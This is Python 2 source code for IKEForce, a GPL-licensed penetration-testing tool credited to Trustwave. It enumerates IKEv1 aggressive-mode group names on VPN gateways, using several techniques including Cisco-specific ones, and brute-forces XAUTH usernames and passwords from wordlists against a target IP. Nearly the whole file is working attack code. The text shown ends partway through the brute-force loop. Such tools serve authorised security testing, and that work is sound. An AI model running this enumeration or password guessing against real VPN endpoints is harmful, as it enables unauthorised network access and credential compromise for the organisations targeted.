#!/usr/bin/python

#IKEForce
#Created by Daniel Turner dturner@trustwave.com
#Copyright (C) 2014 Trustwave Holdings, Inc.
#This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
#This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.

import sys,threading,time,SocketServer,struct,array,select,socket
import ikeclient
import dh
import ikehandler
import crypto
import vid
from optparse import OptionParser
from termios import tcflush, TCIOFLUSH

usageString = "Usage: %prog [target] [mode] -w /path-to/wordlist.txt [optional] -t 5 1 1 2\nExample: %prog 192.168.1.110 -e -w groupnames.txt"
parser = OptionParser(usage=usageString)
parser.add_option("-w","--wordlist",dest="wordlist",default=None,type="string",help="Path to wordlist file")
parser.add_option("-t","--trans",dest="trans",default=None,help="[OPTIONAL] Transform set: encryption type, hash type, authentication type, dh group (5 1 1 2)",nargs=4,type="int")
parser.add_option("-e","--enum",dest="enum",default=None,action="store_true",help="Set Enumeration Mode")
parser.add_option("-b","--brute",dest="brute",default=None,action="store_true",help="Set XAUTH Brute Force Mode")
parser.add_option("-k","--psk",dest="psk",default=None,type="string",help="Pre Shared Key to be used with Brute Force Mode")
parser.add_option("-i","--id",dest="id",default=None,type="string",help="ID or group name. To be used with Brute Force Mode")
parser.add_option("-u","--username",dest="username",default=None,type="string",help="XAUTH username to be used with Brute Force Mode")
parser.add_option("-U","--userlist",dest="userlist",default=None,type="string",help="[OPTIONAL] XAUTH username list to be used with Brute Force Mode")
parser.add_option("-p","--password",dest="password",default=None,type="string",help="XAUTH password to be used with Connect Mode")
parser.add_option("--sport",dest="sport",default=500,type="int",help="Source port to use, default is 500")
parser.add_option("-d","--debug",dest="debug",default=None,action="store_true",help="Set debug on")
parser.add_option("-c","--connect",dest="connect",default=None,action="store_true",help="Set Connect Mode (test a connection)")
parser.add_option("-y","--idtype",dest="idtype",default=None,type="int",help="[OPTIONAL] ID Type for Identification payload. Default is 2 (FQDN)")
parser.add_option("-s","--speed",dest="speed",default=3,type="int",help="[OPTIONAL] Speed of guessing attempts. A numerical value between 1 - 5 where 1 is faster and 5 is slow. Default is 3")
parser.add_option("-l","--keylen",dest="keylen",default=None,type="int",help="[OPTIONAL] Key Length, for use with AES encryption types")


(opts,args) = parser.parse_args()

usage = "Usage: %s [target] [mode] -w /path-to/wordlist.txt [optional] -t 5 1 1 2"%sys.argv[0]

if len(sys.argv) < 2:
	print usage
	exit(0)

targetIP = sys.argv[1]
wordlist = opts.wordlist
wordcount = 0
passcount = 0
usercount = 0

enum = opts.enum
brute = opts.brute
psk = opts.psk
IDdata = opts.id
username = opts.username
userlist = opts.userlist
password = opts.password
debug = opts.debug
connect = opts.connect
trans = opts.trans
idType = opts.idtype

try:
	opts.sport
	sport = opts.sport
except:
	sport = 500

if debug == True:
	print "[+]Debugging Enabled"
	debug = 1
else:
	debug = 0

dicVIDs = vid.dicVIDs

#Check required arguments are provided
if enum == True:
	print "[+]Program started in Enumeration Mode"
	if debug > 0:
		print "Ensure the device accepts the selected Transform Set as this may cause inaccurate results"
	if targetIP != None:
		pass
	else:
        	print usage
        	print "target IP address argument required"
        	exit(0)
        if wordlist != None:
		wordsfile = open(wordlist, "r")
		pass
	else:
                print usage
                print "Group/ID wordlist required for Enumeration Mode"
                exit(0)

elif brute == True:
	print "[+]Program started in XAUTH Brute Force Mode"

	if userlist != None:
	        print "[+]Userlist provided - brute forcing usernames and passwords\nPress return for a status update"
	else:
	        print "[+]Single user provided - brute forcing passwords for user: %s\nPress return for a status update"%username

	if targetIP != None:
		pass
	else:
        	print usage
        	print "-t target IP address argument required"
        	exit()
	if wordlist != None:
		wordsfile = open(wordlist, "r")
		pass
	else:
		print usage
		print "Password wordlist required for Brute Force Mode"
		exit()
	if userlist != None:
		userlist = open(userlist, "r")
		pass
		
        if IDdata != None:
		pass
	else: 
                print usage
                print "ID/Group name required for Brute Force Mode"
		exit()
        if psk == None:
                print usage
                print "PSK required for Brute Force Mode"
		exit()
        if username != None or userlist != None:
		pass
	else:
                print usage
                print "Username required for Brute Force Mode"
		exit()

elif connect == True:
        print "[+]Program started in Test Mode\n"
        if targetIP != None:
                pass
        else:   
                print usage
                print "-t target IP address argument required"
                exit()
        if IDdata != None:
                pass
        else:   
                print usage
                print "ID/Group name required for Test Mode"
                exit()
        if psk == None:
                print usage
                print "PSK required for Test Mode"
                exit()
        if username != None:
                pass
        else:   
                print usage
                print "XAUTH username required for Test Mode"
                exit()

else:
	print usage
	print "-e or -b (mode) argument required"
	exit()

try:
    socket.inet_aton(targetIP)
except socket.error:
        print usage
        print "Target IP address required as first argument"
        exit()

if idType:
	idType = hex(idType)[2:].zfill(2)

else:
	idType = "02"

if trans:
	encType = hex(trans[0])[2:].zfill(2)
	hashType = hex(trans[1])[2:].zfill(2)
	authType = hex(trans[2])[2:].zfill(4)
	DHGroup = hex(trans[3])[2:].zfill(2)
	pass
else:
	#Use static transform values if none are provided
	encType = "05" #3DES
	hashType = "md5"
	authType = "FDE9" #Xauth pre shared key (65001)
	DHGroup = "02" #Diffie Hellman Group 2
	pass


if opts.speed:
	speed = opts.speed
else:
	speed = 3


packets = []
dupPackets = []
dicCrypto = {}




if encType == "3DES-CBC" or encType == "05" or encType == 5:
	keyLen = 24
	IVlen = 16 
if encType == "DES-CBC" or encType == "01" or encType == 1:
	keyLen = 8
	IVlen = 16
if encType == "AES-CBC" or encType == "07" or encType == 7:
	if opts.keylen == None:
        	keyLen = 16 #length 16 but 32 for our purposes as the processing uses hex encoded values

	else:
		keyLen = opts.keylen / 8
	IVlen = 32

enumType = ""

class IKERequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        data,sock = self.request
        curThread = threading.currentThread()
        response = "%s: %s"%(curThread.getName(), data)
        hexPacket =  data.encode('hex')
	
	if hexPacket in packets:
		indexPacket = int(packets.index(hexPacket)) + 1
		dupPackets.append(hexPacket)
		if debug > 0:
		        print "\n--------------------Received Packet Number: %s--------------------\n"%(len(packets)+len(dupPackets))
			print "Duplicate of packet %s, discarding"%indexPacket
			print "Duplicate packet count: %s"%len(dupPackets)
	else:
		packets.append(hexPacket)
		if debug > 0:
			print "\n--------------------Received Packet Number: %s--------------------\n"%(len(packets)+len(dupPackets))
			print packets[-1] + "\n"
	return

class ThreadedIKEServer(SocketServer.ThreadingMixIn, SocketServer.UDPServer):
    pass


if __name__ == '__main__':
    port = 500
    address = ('0.0.0.0', sport) 
    server = ThreadedIKEServer(address, IKERequestHandler)
    try:
    	t = threading.Thread(target=server.serve_forever)
    	t.daemon = True
    	if debug > 0:
		print 'IKE Server running in %s'%t.getName()
    	t.start()
    	while True:
	    if enum:
		    wordline = 0
		    IDdata = "thiSIDDoesnotexit33349204"
		    psk = "anypskthatdoesnotexistfhfhssi575"
		    ikeneg = ikeclient.IKEv1Client(debug)
		    ikeCrypto = crypto.ikeCrypto()
		    print "[+]Checking for possible enumeration techniques"
		    if len(packets) == 0:
			if debug > 0:
	                        print "\n--------------------Sending initial packet - this will help decide which enumeration technnique to use--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"
			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
			dicCrypto = initDict
			print "Analyzing initial response. Please wait, this can take up to 30 seconds..."
			#Count lines in wordlist for later use
                        for w in wordsfile:
                        	wordcount += 1
                        wordsfile.seek(0)
			time.sleep(10)
			#First device check, checking for response packet
			if len(packets) == 0:
			    if debug > 0:
				    print "--------------------No response received-------------------"
                            enumType = "Generic"
                            print "[+]Using Generic enumeration technique. Where no initial response is received for an incorrect ID and the handshake is continued if correct"
			    raw_input("[+]WARNING - This method is the least reliable, the device may genuinely not accept aggressive mode connections.\nHowever, some devices do allow enumeration in this way - Watchguard devices for example. Note that these devices use ID type 3 not the default of 2. Set with -y 3.\n[+]Press return to accept and continue.\n")
			    print "[+]Generic enumeration technique running..."
			    print "Press return for a status update"
			    #First count words in file for status update
			    for w in wordsfile:
			    	wordcount += 1
			    wordsfile.seek(0)

			    #Use generic enumeration technique
			    for w in wordsfile:
				wordline += 1
			    	IDdata = w.strip()
			    	#Print update if return is pressed
			    	readInput = [sys.stdin]
			    	inp = select.select(readInput, [], [], 0.1)[0]
			    	if inp:
					percent = wordline / float(wordcount) * 100
			    		print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
			    		tcflush(sys.stdin, TCIOFLUSH)
			    	else:
					pass

				if debug > 0:
					print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
				initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
				time.sleep(speed)
				if len(packets) > 0:
					ikeHandling = ikehandler.IKEv1Handler(debug)
					respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
					print "[*]Correct ID Found: %s\n"%IDdata
					time.sleep(2)
					exit()
				else:
					if debug > 0:
                                        	print "[-] ID Incorrect"
                                        	print "Restarting...\n"
                                        del packets[:]
					continue
			    print "[-]ID not found, try another wordlist. Exiting...\n"
			    time.sleep(2)
			    exit()

		    if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."
			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
			#Check if packet is informational
			if respDict["xType"] == 5:
				if int(respDict["notmsgType"]) == 18:
					enumType = "Info"
					print "[+]Device allows enumeration via 'INVALID-ID-INFORMATION' response"
				elif int(respDict["notmsgType"]) == 14:
					print "[-] Invalid Transform Set selected. Make sure you have an accepted set before running this tool"
					exit()
				else:
					print "[-] Unknown Notify Type received: %s"%ikehandler.docNotType[respDict["notmsgType"]]
					exit()
					
	
			#Begin enumeration (Info)
			if enumType == "Info":
				print "Restarting...\n"
				print "[+]Using Invalid ID Notification Enumeration Technique"
				print "Press return for a status update"
				del packets[:]
                        	#First count words in file for status update
                        	for w in wordsfile:
                                	wordcount += 1
                                wordsfile.seek(0)

				while len(packets) <= 2:
					for w in wordsfile:
					    wordline += 1
					    IDdata = w.strip()	
                                            readInput = [sys.stdin]
                                            inp = select.select(readInput, [], [], 0.1)[0]
                                            if inp:
						percent = wordline / float(wordcount) * 100
                                            	print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
                                            	tcflush(sys.stdin, TCIOFLUSH)

                                            else:
                                            	pass
                    			    if len(packets) == 0: #do we actually need this prob not?
                        			iCookie = ikeneg.secRandom(8).encode('hex')
                        			rCookie = "0000000000000000"
						if debug > 0:
							print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
                        			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
                        			dicCrypto = dict(initDict.items())
						time.sleep(speed)

						if len(packets) == 1:

        					        #Parse full packet
                        				respDict,listVIDs = ikeHandling.main(packets[-1],encType,hashType)
                        				#Update state/crypto dictionary
                        				dicCrypto.update(respDict)
							if dicCrypto["xType"] == 4:
								print "[*]Correct ID Found: %s\n"%IDdata
								time.sleep(2)
								exit()
							elif dicCrypto["xType"] == 5 and dicCrypto["notmsgType"] == 18:
								del packets[:]
								continue
							elif dicCrypto["xType"] == 5:
								print "[*]Potential Correct ID Found: %s\n"%IDdata
								print "However, a notification payload was received. This may be due to an invalid Transform Set or other error. To be sure try a connection with a valid Transform Set."
								time.sleep(2)
								exit()
						

					print "[-]ID not found, try another wordlist. Exiting...\n"
					time.sleep(2)
					exit()
			else:
				pass

			#Enumerate the device type and decide what technique to use for ID/group enumeration
                        for i in listVIDs:
                                try:
					if debug > 0:
	                                        print "VID received: %s (%s)"%(dicVIDs[i], i)
					if "Cisco" in dicVIDs[i]:
						enumType = "Cisco"

                                except:
					if debug > 0:
	                                        print "Unknown VID received: %s"%i
					pass
			if enumType == "Cisco":
				print "\n[+]Cisco Device detected"
				for i in listVIDs:
                                	try:
                                        	if "Dead Peer" in dicVIDs[i]: 
							print "[-]Not vulnerable to DPD group name enumeration" 
							if len(packets) + len(dupPackets) > 1:
								print "[-]Not vulnerable to multiple response group name enuemration. Device is fully patched. Exiting...\n"
								time.sleep(2)
								exit()
							else:
								print "[+]Device is vulnerable to multiple response group name enumeration"
								enumType = "Cisco2"
								break
						else:
							enumType = "Cisco1"
							pass

                                	except TypeError:
                                        	pass

			else:
				print "[-]No matching enumeration technique available for this device."
				time.sleep(2)
				exit()

			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)

			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
		
                        #Begin enumeration (Cisco1)
                        if enumType == "Cisco1":
                                print "Restarting...\n"
                                print "[+]Using DPD Cisco Group Enumeration Technique"
				print "Press return for a status update"
                                del packets[:]
                                #First count words in file for status update
                                for w in wordsfile:
                                	wordcount += 1
                                wordsfile.seek(0)

                                while len(packets) <= 1:
					for w in wordsfile:
					    wordline += 1
                                            IDdata = w.strip()
                                            readInput = [sys.stdin]
                                            inp = select.select(readInput, [], [], 0.1)[0]
                                            if inp:
						    percent = wordline / float(wordcount) * 100
                                                    print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
                                                    tcflush(sys.stdin, TCIOFLUSH)
                                            else:
                                                    pass
                                            if len(packets) == 0: #do we actually need this prob not?
                                                iCookie = ikeneg.secRandom(8).encode('hex')
                                                rCookie = "0000000000000000"
						if debug > 0:
	                                                print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
                                                initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
                                                dicCrypto = dict(initDict.items())
                                                time.sleep(speed)
                                                try:
							respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
							for i in listVIDs:
       	  			                        	if "afcad71368a1f1c96b8696fc7" in str(i): #DPD VID
	       	                		        		print "[*]Correct ID Found: %s\n"%IDdata
									time.sleep(2)
									exit()
                                                		else:
									pass

							del packets[:]
							del listVIDs[:]
							continue

						except IndexError:
							print "[*] Correct ID Found: %s. However this Group/ID probably does not have a PSK associated with it and the handshake will not complete. Continuing...\n"%IDdata
							pass
					print "[-]ID not found, try another wordlist. Exiting...\n"
					time.sleep(2)
					exit()

			#Begin enumeration (Cisco2)
			if enumType == "Cisco2":
				print "Restarting...\n"
				print "[+]Using New Cisco Group Enumeration Technique"
				print "Press return for a status update"
				del packets[:]
                                #First count words in file for status update
                                for w in wordsfile:
                                	wordcount += 1
                                wordsfile.seek(0)

				while len(packets) <= 2:
					for w in wordsfile:
					    wordline += 1
					    IDdata = w.strip()
                                            readInput = [sys.stdin]
                                            inp = select.select(readInput, [], [], 0.1)[0]
                                            if inp:
						    percent = wordline / float(wordcount) * 100
                                                    print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
                                                    tcflush(sys.stdin, TCIOFLUSH)

                                            else:
                                                    pass
                    			    if len(packets) == 0: #do we actually need this prob not?
                        			iCookie = ikeneg.secRandom(8).encode('hex')
                        			rCookie = "0000000000000000"
						if debug > 0:
							print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
                        			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
                        			dicCrypto = dict(initDict.items())
						time.sleep(speed)
						if len(packets) < 1:
							time.sleep(4)
							if len(packets) < 1:
	                                                        print "[*] Correct ID Found: %s. However this Group/ID does not have a PSK associated with it. Continuing...\n"%IDdata
								continue
						else:
                                                        pass
							
					    if len(packets) == 1:
			                        #Process Header first
        			                ikeHandling = ikehandler.IKEv1Handler(debug)
                        			ikeHDR = ikeHandling.parseHeader(packets[-1])
                       				#Check the packet is for this session
                        			if ikeHDR[1] == dicCrypto["iCookie"]:
                                			pass
                        			else:   
                                			if debug > 0:
                                        			print "Packet received does not match this session, this is probably from a previous incarnation"
                                        			print "Removing packet"
                                			del packets[-1]
                                			continue
						try:
							respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
						except IndexError:
							print "[*]Correct ID Found: %s. However this Group/ID probably does not have a PSK associated with it and the handshake will not complete. Continuing...\n"%IDdata
							continue
                        			dicCrypto.update(respDict)

                        			#Pull the useful values from stored dictionary for crypto functions
                        			nonce_i = dicCrypto["nonce_i"]
                        			DHPubKey_i = dicCrypto["DHPubKey_i"]
                        			nonce_r = dicCrypto["nonce_r"]
                        			ID_i = dicCrypto["ID_i"]
                        			ID_r = dicCrypto["ID_r"]
                        			rCookie = dicCrypto["rCookie"]
                        			xType = dicCrypto["xType"]
                        			msgID = dicCrypto["msgID"]
                        			privKey = dicCrypto["privKey"]
                        			DHPubKey_r = dicCrypto["DHPubKey_r"]
                        			SA_i = dicCrypto["SA_i"]
                        			#Check exchange type is in the right format
                        			try:
                        			        xType = hex(xType)[2:].zfill(2)
                        			except:
                        		        	pass
						#Construct final aggressive mode exchange packet
						if debug > 0:
							print "Processing response..."				
						#Run Crypto Functions - DH first
						ikeDH = dh.DiffieHellman(DHGroup)
						secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
						hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int
                        			if len(hexSecret) % 2 != 0:
                                			#Odd length string fix/hack
                                			hexSecret = "0" + hexSecret
						if debug > 0:
							print "SA_i: %s"%sSA_i
							print "Secret: %s"%secret
							print "Hexlified Secret: %s"%hexSecret

						skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
						hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
						hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
						skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
						skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
						skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
	                        		if len(skeyid_e) < keyLen:
                                			encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
		                                	if debug > 0:
        		                                	print "Encryption Key: %s"%encKey.encode('hex')
                        			else:   
                                			encKey = skeyid_e[:keyLen]
							if debug > 0:
								print "Encryption Key: %s"%encKey.encode('hex')
						initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
					
						dicCrypto["skeyid"] = skeyid
						dicCrypto["skeyid_a"] = skeyid_a
						dicCrypto["skeyid_d"] = skeyid_d
						dicCrypto["skeyid_e"] = skeyid_e
						dicCrypto["encKey"] = encKey
						dicCrypto["initIV"] = initIV

						#Hash payload
						arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload 11 = notification
                        			lenHash = len(arrayHash)
                        			bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                        			#VID payload
                        			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        			lenVID = len(arrayVID)
                        			bytesVID = struct.pack(("B"*lenVID),*arrayVID)
						
                        			#Encrypt everything but the header
						plainData = (bytesHash+bytesVID)
						plainPayload = ikeCrypto.calcPadding(encType, plainData)
						if debug > 0: 
                                			print "Plain-text Payload: %s"%plainPayload.encode('hex')
				
                        			cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        			encPayload = cipher.encrypt(plainPayload)
			
						if debug > 0:
							print "Encrypted Payload: %s"%encPayload.encode('hex')

        					arrayencPayload = array.array('B', encPayload)
						lenencPayload = len(arrayencPayload)
						bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
						arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
						lenHDR = len(arrayHDR)
						bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  					bytesIKE = bytesHDR+bytesencPayload
						if debug > 0:
							print "\n--------------------Sending second (encrypted) Aggressive Mode packet--------------------"
						ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
						dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        			dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#phase 2 IV and last block are the same at this point
						time.sleep(speed)
					    if len(packets) > 1:
							#Parse the header first
							ikeHandling = ikehandler.IKEv1Handler(debug)
                        				ikeHDR = ikeHandling.parseHeader(packets[1])
				                        #Check the packet is for this session
                        				if ikeHDR[1] == dicCrypto["iCookie"]:
                                				pass
                        				else:   
								if debug > 0:
	                                				print "Packet received does not match this session, this is probably from a previous incarnation."
									print "Removing packet"
                                				del packets[-1]
                                				continue

		                            		try:   
                    			        	    	if ikeHDR[5] == dicCrypto["msgID"]:
                                        				if debug > 0:
                                                				print "Message ID has not changed"

		                                        		curIV = dicCrypto["lastBlock"].decode('hex')
                		                        		pass    
                        		            		else:
                                        				if debug > 0:
                                                				print "Message ID has changed, recalculating IV"
                                        				msgID = ikeHDR[5]
                                        				curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        				pass
		                            		except:
                    			    			print "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting"
                                				exit()

        					        #Parse full packet
                        				respDict,listVIDs = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        				#Update state/crypto dictionary
                        				dicCrypto.update(respDict)
							if dicCrypto["xType"] == "05" or 5:
								print "[*]Correct ID Found: %s\n"%IDdata
								time.sleep(2)
								exit()
							else:
								if debug > 0:
	                                                                print "Packet received does not match this session, this is probably from a previous incarnation."
									print "Removing packet"
                                                                del packets[-1]
                                                                continue

					    else:
						if debug > 0:
							print "No further responses received\n"
							print "[-] ID Incorrect"
							print "Restarting...\n"
						del packets[:]

					print "[-]ID not found, try another wordlist. Exiting...\n"
					time.sleep(2)
					exit()
			else:
				print "No enumeration technique matched. Exiting...\n"
				time.sleep(2)
				exit()		


	    elif brute:
	     #Run XAUTH brute force
	     #First count the lines in the file due to the way python handles EOF and the way we need to reset the connection after 3 attempts for cisco
             for w in wordsfile:
               wordcount += 1
             wordsfile.seek(0)
	     ikeneg = ikeclient.IKEv1Client(debug)
	     ikeCrypto = crypto.ikeCrypto()
	     if userlist != None:
	      for u in userlist:
		usercount += 1
	      userlist.seek(0)
	      for u in userlist:
	       passcount = 0
	       wordsfile.seek(0)
	       username = u.strip()
	       while passcount < wordcount:
		if len(packets) == 0:
			if debug > 0:
				print "\n--------------------Sending first Aggressive Mode packet--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"
			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
			time.sleep(speed)
			if len(packets) == 0:
				print "No response received, exiting...\n"
				time.sleep(2)
				exit()
			dicCrypto = dict(initDict.items())
			while len(packets) < 1:
				time.sleep(0.5)

		if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."

                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                if debug > 0:
                                        print "Packet received does not match this session, this is probably from a previous incarnation"
                                        print "Removing packet"
                                del packets[-1]
                                continue

                        #Check for informational packet
                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
                                respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
                        else:
                                pass

			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
			dicVIDs = vid.dicVIDs
			for i in listVIDs:
				try:
					if debug > 0:
						print "VID received: %s (%s)"%(dicVIDs[i], i)
					if "Cisco" in dicVIDs[i]:
						vendorType = "cisco"
				except:
					if debug > 0:
						print "Unknown VID received: %s"%i
	



			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)
			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
			
			#Construct final aggressive mode exchange packet
			if debug > 0:
				print "\n--------------------Sending second aggressive mode packet--------------------"
			#Run Crypto Functions - DH first
			ikeDH = dh.DiffieHellman(DHGroup)
			secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
			hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int, if this fails fallback to old style
			if len(hexSecret) % 2 != 0:
				hexSecret = "0" + hexSecret
			if debug > 0:
				print "Secret: %s"%secret
				print "Hexlified Secret: %s"%hexSecret

			skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
			hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
			hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
			skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			if len(skeyid_e) < keyLen:   
				encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
	                        if debug > 0:
                                        print "Encryption Key: %s"%encKey.encode('hex')
			else:
				encKey = skeyid_e[:keyLen]
				if debug > 0:
					print "Encryption Key: %s"%encKey.encode('hex')
			initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
			
			dicCrypto["skeyid"] = skeyid
			dicCrypto["skeyid_a"] = skeyid_a
			dicCrypto["skeyid_d"] = skeyid_d
			dicCrypto["skeyid_e"] = skeyid_e
			dicCrypto["encKey"] = encKey
			dicCrypto["initIV"] = initIV
			#Hash payload
			arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload - VID (13)
                        lenHash = len(arrayHash)
                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)
			#VID payload
			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        lenVID = len(arrayVID)
                        bytesVID = struct.pack(("B"*lenVID),*arrayVID)
                        #Encrypt everything but the header
			plainData = bytesHash+bytesVID
			plainPayload = ikeCrypto.calcPadding(encType, plainData)
			if debug > 0: 
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
				
                        cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        encPayload = cipher.encrypt(plainPayload)
			
			if debug > 0:
				print "Encrypted Payload: %s"%encPayload.encode('hex')

        		arrayencPayload = array.array('B', encPayload)
			lenencPayload = len(arrayencPayload)
			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
			lenHDR = len(arrayHDR)
			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  		bytesIKE = bytesHDR+bytesencPayload
			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
			dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
